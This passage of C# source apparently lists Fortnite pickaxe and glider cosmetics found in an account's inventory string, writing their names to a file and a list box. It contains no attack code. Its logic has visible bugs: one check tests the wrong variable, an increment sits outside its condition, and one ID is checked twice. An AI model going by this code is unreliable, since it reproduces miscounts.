                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound83 = x.Contains("AthenaPickaxe:pickaxe_id_107_halloweentomato");
                            if (NewAxesFound83)
                            {
                                sw.WriteLine("=> Night Slicer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Night Slicer");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound84 = x.Contains("AthenaPickaxe:pickaxe_id_122_witch");
                            if (NewAxesFound84)
                            {
                                sw.WriteLine("=> Spellslinger");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Spellslinger");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound85 = x.Contains("AthenaPickaxe:pickaxe_id_123_hornedmask");
                            if (NewAxesFound85)
                            {
                                sw.WriteLine("=> Gatekeeper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Gatekeeper");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound86 = x.Contains("AthenaPickaxe:pickaxe_id_124_feathers");
                            if (NewAxesFound86)
                            {
                                sw.WriteLine("=> Scrambler");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Scrambler");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound87 = x.Contains("AthenaPickaxe:pickaxe_id_125_moth");
                            if (NewAxesFound87)
                            {
                                sw.WriteLine("=> Lamp");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Lamp");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound88 = x.Contains("AthenaPickaxe:pickaxe_id_134_snowman");
                            if (NewAxesFound88)
                            {
                                sw.WriteLine("=> Icicle");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Icicle");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound89 = x.Contains("AthenaPickaxe:pickaxe_id_126_yeti");
                            if (NewAxesFound89)
                            {
                                sw.WriteLine("=> Abominable Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Abominable Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound90 = x.Contains("AthenaPickaxe:pickaxe_id_127_rhino");
                            if (NewAxesFound90)
                            {
                                sw.WriteLine("=> Uni-horn");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Uni-horn");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound91 = x.Contains("AthenaPickaxe:pickaxe_id_131_nautilus");
                            if (NewAxesFound91)
                            {
                                sw.WriteLine("=> Tbd");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tbd");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound92 = x.Contains("AthenaPickaxe:pickaxe_id_131_neoncat");
                            if (NewAxesFound92)
                            {
                                sw.WriteLine("=> Scratchmark");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Scratchmark");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound93 = x.Contains("AthenaPickaxe:pickaxe_id_132_arcticsniper");
                            if (NewAxesFound93)
                            {
                                sw.WriteLine("=> Scorcher");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Scorcher");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound94 = x.Contains("AthenaPickaxe:pickaxe_id_133_iceking");
                            if (NewAxesFound94)
                            {
                                sw.WriteLine("=> Ice Scepter");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ice Scepter");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound95 = x.Contains("AthenaPickaxe:pickaxe_id_135_snowninja");
                            if (NewAxesFound95)
                            {
                                sw.WriteLine("=> Inverted Blade");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Inverted Blade");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound96 = x.Contains("AthenaPickaxe:pickaxe_id_136_math");
                            if (NewAxesFound96)
                            {
                                sw.WriteLine("=> T-square");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> T-square");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound97 = x.Contains("AthenaPickaxe:pickaxe_id_137_nutcracker");
                            if (NewAxesFound97)
                            {
                                sw.WriteLine("=> Snow Globe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Snow Globe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound98 = x.Contains("AthenaPickaxe:pickaxe_id_138_gnome");
                            if (NewAxesFound98)
                            {
                                sw.WriteLine("=> Cold Snap");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cold Snap");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound99 = x.Contains("AthenaPickaxe:pickaxe_id_139_gingerbread");
                            if (NewAxesFound99)
                            {
                                sw.WriteLine("=> Cookie Cutter");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cookie Cutter");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound100 = x.Contains("AthenaPickaxe:pickaxe_id_140_streetgoth");
                            if (NewAxesFound100)
                            {
                                sw.WriteLine("=> Vision");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Vision");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound101 = x.Contains("AthenaPickaxe:pickaxe_id_141_krampus");
                            if (NewAxesFound101)
                            {
                                sw.WriteLine("=> Brat Catcher");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Brat Catcher");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound102 = x.Contains("AthenaPickaxe:pickaxe_id_142_teriyakifish");
                            if (NewAxesFound102)
                            {
                                sw.WriteLine("=> Bootstraps");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bootstraps");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound103 = x.Contains("AthenaPickaxe:pickaxe_id_143_flintlockwinter");
                            if (NewAxesFound103)
                            {
                                sw.WriteLine("=> Frozen Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Frozen Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound104= x.Contains("AthenaPickaxe:pickaxe_id_144_angel");
                            if (NewAxesFound104)
                            {
                                sw.WriteLine("=> Virtue");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Virtue");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound105 = x.Contains("AthenaPickaxe:pickaxe_id_145_icemaiden");
                            if (NewAxesFound105)
                            {
                                sw.WriteLine("=> Flurry");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Flurry");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                        }
                        int TotalGliders = 0;
                        if (CheckForGliders.Checked)
                        {
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            sw.WriteLine("----------------------<Gliders>------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("----------------------<Gliders>------------------------");
                            }
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            bool glidercheck1 = x.Contains("glider_id_001");
                            if (glidercheck1)
                            {
                                sw.WriteLine("=> Aerial Assault One");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Aerial Assault One");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck2 = x.Contains("glider_id_002_medieval");
                            if (glidercheck2)
                            {
                                sw.WriteLine("=> Sir Glider the Brave");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sir Glider the Brave");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck3 = x.Contains("glider_id_003_district");
                            if (glidercheck3)
                            {
                                sw.WriteLine("=> Royale X");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Royale X");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck4 = x.Contains("glider_id_004_disco");
                            if (glidercheck4)
                            {
                                sw.WriteLine("=> Get Down!");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Get Down!");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck5 = x.Contains("glider_id_005_holidaysweater");
                            if (glidercheck5)
                            {
                                sw.WriteLine("=> Cozy Coaster");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cozy Coaster");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck6 = x.Contains("glider_id_006_wintercamo");
                            if (glidercheck6)
                            {
                                sw.WriteLine("=> Snow Squall");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Snow Squall");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck7 = x.Contains("glider_id_007_turtleshell");
                            if (glidercheck7)
                            {
                                sw.WriteLine("=> Half Shell");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Half Shell");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck8 = x.Contains("glider_id_008_graffiti");
                            if (glidercheck8)
                            {
                                sw.WriteLine("=> Zephyr");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Zephyr");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck9 = x.Contains("glider_id_009_candycoat");
                            if (glidercheck9)
                            {
                                sw.WriteLine("=> Gum Drop");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Gum Drop");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck10 = x.Contains("glider_id_010_storm");
                            if (glidercheck10)
                            {
                                sw.WriteLine("=> Cloud Strike");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cloud Strike");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck11 = x.Contains("glider_id_011_jollyroger");
                            if (glidercheck11)
                            {
                                sw.WriteLine("=> Jolly Roger");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Jolly Roger");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck12 = x.Contains("glider_id_012_teddybear");
                            if (glidercheck12)
                            {
                                sw.WriteLine("=> Bear Force One");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bear Force One");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck13 = x.Contains("glider_id_013_psblue");
                            if (glidercheck13)
                            {
                                sw.WriteLine("=> Blue Streak");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Blue Streak");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck14 = x.Contains("glider_id_014_dragon");
                            if (glidercheck14)
                            {
                                sw.WriteLine("=> Royale Dragon");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Royale Dragon");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck15 = x.Contains("glider_id_015_brite");
                            if (glidercheck15)
                            {
                                sw.WriteLine("=> Rainbow Rider");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rainbow Rider");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck16 = x.Contains("glider_id_016_tactical");
                            if (glidercheck16)
                            {
                                sw.WriteLine("=> Carbon");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Carbon");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck17 = x.Contains("glider_id_017_assassin");
                            if (glidercheck17)
                            {
                                sw.WriteLine("=> High Octane");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> High Octane");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck18 = x.Contains("glider_id_018_twitch");
                            if (glidercheck18)
                            {
                                sw.WriteLine("=> Slipstream");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Slipstream");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck19 = x.Contains("glider_id_020_fighter");
                            if (glidercheck19)
                            {
                                sw.WriteLine("=> Fighter Kite");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Fighter Kite");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck20 = x.Contains("glider_mig");
                            if (glidercheck20)
                            {
                                sw.WriteLine("=> Raptor");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Raptor");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck21 = x.Contains("glider_military");
                            if (glidercheck21)
                            {
                                sw.WriteLine("=> Warthog");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Warthog");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck22 = x.Contains("glider_prismatic");
                            if (glidercheck22)
                            {
                                sw.WriteLine("=> Prismatic");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Prismatic");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck23 = x.Contains("glider_roadtrip");
                            if (glidercheck23)
                            {
                                sw.WriteLine("=> Roadtrip");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Roadtrip");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck24 = x.Contains("glider_stealth");
                            if (glidercheck24)
                            {
                                sw.WriteLine("=> Stealth");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Stealth");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck25 = x.Contains("glider_venom");
                            if (glidercheck25)
                            {
                                sw.WriteLine("=> Wasp");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Wasp");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck26 = x.Contains("glider_voyager");
                            if (glidercheck26)
                            {
                                sw.WriteLine("=> Voyager");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Voyager");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck27 = x.Contains("glider_warthog");
                            if (glidercheck27)
                            {
                                sw.WriteLine("=> Mako");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Mako");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck28 = x.Contains("glider_id_019_taxi");
                            if (glidercheck28)
                            {
                                sw.WriteLine("=> Checker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Checker");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck29 = x.Contains("glider_id_021_scavenger");
                            if (glidercheck29)
                            {
                                sw.WriteLine("=> Rusty Rider");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rusty Rider");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck30 = x.Contains("glider_id_022_rockerpunk");
                            if (glidercheck30)
                            {
                                sw.WriteLine("=> Stage Dive");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Stage Dive");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck31 = x.Contains("glider_id_023_cuchulainn");
                            if (glidercheck31)
                            {
                                sw.WriteLine("=> Storm Sigil");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Storm Sigil");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck32 = x.Contains("glider_id_024_reaper");
                            if (glidercheck32)
                            {
                                sw.WriteLine("=> Feathered Flyer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Feathered Flyer");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck33 = x.Contains("glider_id_025_shuttlea");
                            if (glidercheck33)
                            {
                                sw.WriteLine("=> Orbital Shuttle");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Orbital Shuttle");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck34 = x.Contains("glider_id_026_shuttleb");
                            if (glidercheck34)
                            {
                                sw.WriteLine("=> Deep Space Lander");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Deep Space Lander");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck35 = x.Contains("glider_id_027_satelite");
                            if (glidercheck35)
                            {
                                sw.WriteLine("=> Planetary Probe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Planetary Probe");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck36 = x.Contains("glider_id_028_googly");
                            if (glidercheck36)
                            {
                                sw.WriteLine("=> Googly");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Googly");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck37 = x.Contains("glider_id_029_pajamaparty");
                            if (glidercheck37)
                            {
                                sw.WriteLine("=> Fossil Flyer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Fossil Flyer");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck38 = x.Contains("glider_id_030_circuitbreaker");
                            if (glidercheck38)
                            {
                                sw.WriteLine("=> Mainframe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Mainframe");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck39 = x.Contains("defaultglider");
                            if (glidercheck39)
                            {
                                sw.WriteLine("=> Default Glider");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Default Glider");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck40 = x.Contains("duo_umbrella");
                            if (glidercheck40)
                            {
                                sw.WriteLine("=> Duo Umbrella");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Duo Umbrella");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck41 = x.Contains("founderglider");
                            if (glidercheck41)
                            {
                                sw.WriteLine("=> Founder's Glider");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Founder's Glider");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck42 = x.Contains("founderumbrella");
                            if (glidercheck42)
                            {
                                sw.WriteLine("=> Founder's Umbrella");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Founder's Umbrella");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck43 = x.Contains("glider_Bold");
                            if (glidercheck43)
                            {
                                sw.WriteLine("=> Modern");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Modern");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck44 = x.Contains("glider_Flames");
                            if (glidercheck44)
                            {
                                sw.WriteLine("=> Hot Rod");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hot Rod");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck45 = x.Contains("glider_FlowerPower");
                            if (glidercheck45)
                            {
                                sw.WriteLine("=> Petunia");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Petunia");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck46 = x.Contains("glider_voyager");
                            if (glidercheck46)
                            {
                                sw.WriteLine("=> Voyager");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Voyager");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck47 = x.Contains("preseasonglider_elite");
                            if (glidercheck47)
                            {
                                sw.WriteLine("=> Rainbow Glider Elite");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rainbow Glider Elite");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck48 = x.Contains("solo_umbrella");
                            if (glidercheck48)
                            {
                                sw.WriteLine("=> The Umbrella");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> The Umbrella");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck49 = x.Contains("squad_umbrella");
                            if (glidercheck49)
                            {
                                sw.WriteLine("=> Squad Umbrella");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Squad Umbrella");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck50 = x.Contains("preseasonglider");
                            if (glidercheck50)
                            {
                                sw.WriteLine("=> Rainbow Glider");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rainbow Glider");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck51 = x.Contains("glider_id_031_metal");
                            if (glidercheck51)
                            {
                                sw.WriteLine("=> Solid Strider");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Solid Strider");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck52 = x.Contains("glider_id_032_tacticalwoodland");
                            if (glidercheck52)
                            {
                                sw.WriteLine("=> Steadfast");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Steadfast");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck53 = x.Contains("glider_id_033_valor");
                            if (glidercheck52)
                            {
                                sw.WriteLine("=> Wings of Valor");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Wings of Valor");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck79 = x.Contains("glider_id_034_carbideblue");
                            if (glidercheck79)
                            {
                                sw.WriteLine("=> Intrepid");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Intrepid");
                                }
                            }
                            bool glidercheck54 = x.Contains("glider_id_035_candy");
                            TotalGliders = TotalGliders + 1;
                            if (glidercheck54)
                            {
                                sw.WriteLine("=> Sugar Crash");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sugar Crash");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck55 = x.Contains("glider_id_036_auroraglow");
                            if (glidercheck55)
                            {
                                sw.WriteLine("=> Glow Rider");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Glow Rider");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck56 = x.Contains("umbrella_season_04");
                            if (glidercheck56)
                            {
                                sw.WriteLine("=> Wet Paint");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Wet Paint");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck57 = x.Contains("glider_id_037_hazmat");
                            if (glidercheck57)
                            {
                                sw.WriteLine("=> Meltdown");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Meltdown");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck58 = x.Contains("glider_id_038_deco");
                            if (glidercheck58)
                            {
                                sw.WriteLine("=> Triumph");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Triumph");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck59 = x.Contains("glider_id_039_venus");
                            if (glidercheck59)
                            {
                                sw.WriteLine("=> Venus Flyer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Venus Flyer");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck60 = x.Contains("glider_id_040_jailbird");
                            if (glidercheck60)
                            {
                                sw.WriteLine("=> Starry Flight");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Starry Flight");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck61 = x.Contains("glider_id_041_basketball");
                            if (glidercheck61)
                            {
                                sw.WriteLine("=> Hang Time");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hang Time");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck62 = x.Contains("glider_id_042_soccer");
                            if (glidercheck62)
                            {
                                sw.WriteLine("=> Goalbound");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Goalbound");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck63 = x.Contains("glider_id_043_darkninja");
                            if (glidercheck63)
                            {
                                sw.WriteLine("=> Split Wing");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Split Wing");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck64 = x.Contains("glider_id_044_pterodactyl");
                            if (glidercheck64)
                            {
                                sw.WriteLine("=> Pterodactyl");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pterodactyl");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck65 = x.Contains("glider_id_045_carbideBlack");
                            if (glidercheck65)
                            {
                                sw.WriteLine("=> Terminus");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Terminus");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck66 = x.Contains("glider_id_046_gumshoe");
                            if (glidercheck66)
                            {
                                sw.WriteLine("=> Viceroy Mark I");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Viceroy Mark I");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck67 = x.Contains("glider_id_047_speedyred");
                            if (glidercheck67)
                            {
                                sw.WriteLine("=> Forerunner");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Forerunner");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
